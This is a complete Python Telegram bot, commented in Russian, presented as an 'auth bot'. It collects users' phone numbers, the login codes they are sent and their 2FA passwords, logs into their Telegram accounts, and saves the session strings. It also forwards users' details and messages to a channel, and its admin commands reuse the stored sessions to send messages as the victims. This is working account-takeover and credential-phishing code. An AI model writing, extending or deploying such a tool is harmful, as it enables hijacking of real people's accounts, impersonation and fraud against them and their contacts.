#!/usr/bin/env python3
# main.py — Telegram Auth Bot с force_sms, 2FA, шифрованием сессий и админскими командами

import os
import json
import logging
import asyncio
from datetime import datetime
from typing import Optional, Dict

from aiogram import Bot, Dispatcher, Router
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram import F

from telethon import TelegramClient, errors
from telethon.sessions import StringSession

# optional encryption
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except Exception:
    CRYPTO_AVAILABLE = False

# ======== Конфиг через env ========
BOT_TOKEN = os.getenv("PLAY", "").strip()
CHANNEL = os.getenv("CHANNEL", "").strip()  # можно numeric id или @username
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "").strip()
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
MASTER_KEY = os.getenv("MASTER_KEY", "").strip()  # optional

if not BOT_TOKEN or not API_ID or not API_HASH or not ADMIN_ID:
    raise RuntimeError("Set PLAY, API_ID, API_HASH, ADMIN_ID environment variables.")

# try cast channel to int
try:
    CHANNEL_TARGET = int(CHANNEL) if CHANNEL else None
except Exception:
    CHANNEL_TARGET = CHANNEL or None

# ======== Logging ========
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger(__name__)

# ======== FSM ========
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

router = Router()

# ======== Runtime storages ========
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot: Optional[Bot] = None  # инициализируется в main()
user_clients: Dict[int, TelegramClient] = {}      # user_id -> Telethon client (connected)
user_sessions: Dict[int, str] = {}                # user_id -> stored session (encrypted or plain)
user_phone: Dict[int, str] = {}                   # временно хранит номер в процессе авторизации

# ======== Encryption helpers ========
USE_ENCRYPTION = False
fernet = None
if MASTER_KEY:
    if not CRYPTO_AVAILABLE:
        raise RuntimeError("MASTER_KEY set but cryptography not installed.")
    try:
        fernet = Fernet(MASTER_KEY.encode() if isinstance(MASTER_KEY, str) else MASTER_KEY)
        USE_ENCRYPTION = True
    except Exception as e:
        raise RuntimeError("MASTER_KEY invalid. Generate with Fernet.generate_key().") from e

def now_iso() -> str:
    return datetime.utcnow().isoformat()

def encrypt_text(text: str) -> str:
    if USE_ENCRYPTION and fernet:
        return fernet.encrypt(text.encode()).decode()
    return text

def decrypt_text(text: str) -> str:
    if USE_ENCRYPTION and fernet:
        return fernet.decrypt(text.encode()).decode()
    return text

# ======== File helpers ========
def session_path_for(user_id: int) -> str:
    return os.path.join(SESSIONS_DIR, f"{user_id}.session.json")

def save_session_to_file(user_id: int, session_str: str):
    payload = {
        "user_id": user_id,
        "session": encrypt_text(session_str),
        "saved_at": now_iso()
    }
    path = session_path_for(user_id)
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        user_sessions[user_id] = payload["session"]
        logger.info("Saved session for %s -> %s", user_id, path)
    except Exception:
        logger.exception("Failed to save session to %s", path)

def load_sessions_from_disk():
    for fname in os.listdir(SESSIONS_DIR):
        if not fname.endswith(".session.json"):
            continue
        path = os.path.join(SESSIONS_DIR, fname)
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            uid = int(data.get("user_id"))
            stored = data.get("session")
            user_sessions[uid] = stored
            logger.info("Loaded session preview for %s", uid)
        except Exception:
            logger.exception("Failed to load session file %s", path)

# ======== Telethon helper ========
async def create_client_from_session(session: Optional[str] = None) -> TelegramClient:
    sess = StringSession(session) if session else StringSession()
    client = TelegramClient(sess, API_ID, API_HASH)
    await client.connect()
    return client

# ======== UI keyboard ========
def contact_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
        resize_keyboard=True
    )

# ======== Handlers: authorization ========
@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await message.answer("Привет. Нажми кнопку, чтобы отправить номер телефона.", reply_markup=contact_keyboard())
    await state.set_state(AuthFlow.waiting_for_phone)

@router.message(AuthFlow.waiting_for_phone, F.contact)
async def handle_contact(message: Message, state: FSMContext):
    phone = message.contact.phone_number if message.contact else None
    if not phone:
        await message.answer("Не удалось получить номер. Попробуй ещё раз через кнопку.")
        return

    uid = message.from_user.id
    user_phone[uid] = phone

    try:
        client = await create_client_from_session(None)
    except Exception:
        await message.answer("Ошибка создания временного клиента. Попробуй позже.")
        user_phone.pop(uid, None)
        return

    # сначала пробуем SMS, если не доступно — резервно Telegram
    try:
        await client.send_code_request(phone, force_sms=True)
        await message.answer("Код отправлен по SMS. Введите цифры сюда, когда придёт SMS.")
    except errors.FloodWaitError as e:
        await message.answer(f"Слишком много запросов. Подожди {e.seconds} секунд.")
        await client.disconnect()
        user_phone.pop(uid, None)
        return
    except Exception:
        try:
            await client.send_code_request(phone, force_sms=False)
            await message.answer("SMS недоступно. Код отправлен через Telegram. Введите код сюда.")
        except Exception:
            await message.answer("Не удалось запросить код. Попробуй позже.")
            await client.disconnect()
            user_phone.pop(uid, None)
            return

    user_clients[uid] = client
    await state.set_state(AuthFlow.waiting_for_code)

@router.message(AuthFlow.waiting_for_code, F.text.regexp(r"^\d{4,7}$"))
async def handle_code(message: Message, state: FSMContext):
    uid = message.from_user.id
    code = message.text.strip()
    phone = user_phone.get(uid)
    client = user_clients.get(uid)

    if not client or not phone:
        await message.answer("Сессия не найдена. Начни заново: /start")
        await state.clear()
        user_phone.pop(uid, None)
        return

    # логируем факт ввода кода (без публикации самого кода)
    try:
        info = (
            f"Код введён пользователем\n"
            f"User: {message.from_user.full_name} @{message.from_user.username or '-'} ({uid})\n"
            f"Телефон: {phone}\n"
            f"Время: {now_iso()}"
        )
        if bot and CHANNEL_TARGET:
            await bot.send_message(CHANNEL_TARGET, info)
    except Exception:
        pass

    try:
        await client.sign_in(phone=phone, code=code)
        session_str = client.session.save()
        save_session_to_file(uid, session_str)
        await message.answer("Вход успешен. Сессия сохранена.")
        if bot and CHANNEL_TARGET:
            await bot.send_message(CHANNEL_TARGET, f"✅ Вход успешен для {uid} ({phone})")
        # оставляем client подключённым в памяти по желанию администратора
        user_phone.pop(uid, None)
        await state.clear()
    except errors.SessionPasswordNeededError:
        await message.answer("Требуется пароль двухфакторной защиты. Введите пароль.")
        await state.set_state(AuthFlow.waiting_for_2fa)
    except errors.PhoneCodeInvalidError:
        await message.answer("Код неверный. Проверьте SMS/сообщение и попробуйте снова.")
    except errors.PhoneCodeExpiredError:
        await message.answer("Код устарел. Запросите код снова: /start")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()
    except errors.FloodWaitError as e:
        await message.answer(f"Слишком много попыток. Подождите {e.seconds} секунд.")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()
    except Exception:
        logger.exception("sign_in error")
        await message.answer("Ошибка при входе. Попробуйте позже.")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()

@router.message(AuthFlow.waiting_for_2fa)
async def handle_2fa(message: Message, state: FSMContext):
    uid = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(uid)
    phone = user_phone.get(uid)

    if not client or not phone:
        await message.answer("Сессия потеряна. Начни заново: /start")
        await state.clear()
        user_phone.pop(uid, None)
        return

    try:
        await client.sign_in(password=password)
        session_str = client.session.save()
        save_session_to_file(uid, session_str)
        await message.answer("Вход с 2FA выполнен. Сессия сохранена.")
        if bot and CHANNEL_TARGET:
            await bot.send_message(CHANNEL_TARGET, f"✅ Вход (2FA) успешен для {uid} ({phone})")
        # отключаем клиент после 2FA, админ по желанию подключит через /use_session
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()
    except errors.FloodWaitError as e:
        await message.answer(f"Подождите {e.seconds} секунд.")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()
    except Exception:
        logger.exception("2FA sign_in error")
        await message.answer("Не удалось войти с паролем. Проверьте пароль.")
        try:
            await client.disconnect()
        except Exception:
            pass
        user_clients.pop(uid, None)
        user_phone.pop(uid, None)
        await state.clear()

@router.message(F.text)
async def catch_all_forward(message: Message):
    # логируем произвольный текст администратору (не пересылаем коды)
    try:
        text = f"Сообщение от {message.from_user.full_name} @{message.from_user.username or '-'} ({message.from_user.id}):\n{message.text}\n{now_iso()}"
        if bot and CHANNEL_TARGET:
            await bot.send_message(CHANNEL_TARGET, text)
    except Exception:
        pass

# ======== Admin commands ========
@router.message(Command("list_sessions"))
async def admin_list_sessions(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Нет доступа.")
        return
    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session.json")]
    if not files:
        await message.answer("Нет сохранённых сессий.")
        return
    lines = []
    for fname in sorted(files):
        path = os.path.join(SESSIONS_DIR, fname)
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            uid = data.get("user_id", "unknown")
            preview = data.get("session", "")[:36] + "..." if data.get("session") else "—"
            connected = "connected" if (int(uid) in user_clients and user_clients[int(uid)].is_connected()) else "idle"
            lines.append(f"{uid} | {fname} | {connected} | {preview}")
        except Exception:
            lines.append(f"{fname} | ошибка чтения")
    await message.answer("\n".join(lines))

@router.message(Command("who_connected"))
async def admin_who_connected(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lines = []
    for uid, stored in user_sessions.items():
        try:
            preview = decrypt_text(stored)[:28] + "..." if USE_ENCRYPTION else (stored[:28] + "...")
        except Exception:
            preview = "ошибка_декодирования"
        connected = "connected" if (uid in user_clients and user_clients[uid].is_connected()) else "idle"
        lines.append(f"{uid} | {connected} | {preview}")
    await message.answer("\n".join(lines) if lines else "Нет сессий.")

@router.message(Command("use_session"))
async def admin_use_session(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("Использование: /use_session <user_id>")
        return
    try:
        target = int(parts[1])
    except ValueError:
        await message.answer("Неверный user_id")
        return
    path = session_path_for(target)
    if not os.path.isfile(path):
        await message.answer("Файл сессии не найден.")
        return
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        session_stored = data.get("session")
        session_str = decrypt_text(session_stored) if USE_ENCRYPTION else session_stored
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
    except Exception as e:
        await message.answer(f"Ошибка подключения: {e}")
        return
    user_clients[target] = client
    await message.answer(f"Сессия для {target} подключена.")

@router.message(Command("send_as"))
async def admin_send_as(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(maxsplit=3)
    if len(parts) < 4:
        await message.answer("Использование: /send_as <user_id> <chat_id> <текст>")
        return
    try:
        target = int(parts[1])
    except ValueError:
        await message.answer("Неверный user_id")
        return
    chat = parts[2]
    text = parts[3]

    client = user_clients.get(target)
    temporary_connect = False

    if not client or not client.is_connected():
        path = session_path_for(target)
        if not os.path.isfile(path):
            await message.answer("Сессия не найдена на диске.")
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            session_stored = data.get("session")
            session_str = decrypt_text(session_stored) if USE_ENCRYPTION else session_stored
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await client.connect()
            user_clients[target] = client
            temporary_connect = True
        except Exception as e:
            await message.answer(f"Ошибка подключения сессии: {e}")
            return

    try:
        await client.send_message(chat, text)
        await message.answer("Отправлено.")
    except Exception as e:
        await message.answer(f"Ошибка при отправке: {e}")
    finally:
        if temporary_connect:
            try:
                await client.disconnect()
            except Exception:
                pass
            user_clients.pop(target, None)

@router.message(Command("disconnect_session"))
async def admin_disconnect_session(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("Использование: /disconnect_session <user_id>")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        await message.answer("Неверный user_id")
        return
    client = user_clients.pop(uid, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
        await message.answer(f"Клиент {uid} отключён.")
    else:
        await message.answer("Клиент не был подключён.")

@router.message(Command("ping"))
async def admin_ping(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("pong")

# ======== Background worker placeholder ========
async def send_worker():
    while True:
        await asyncio.sleep(60)

# ======== Main entry ========
async def main():
    global bot
    load_sessions_from_disk()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
    worker = asyncio.create_task(send_worker())
    try:
        logger.info("Bot polling started")
        await dp.start_polling(bot)
    finally:
        worker.cancel()
        for uid, client in list(user_clients.items()):
            try:
                await client.disconnect()
            except Exception:
                pass

if __name__ == "__main__":
    asyncio.run(main())
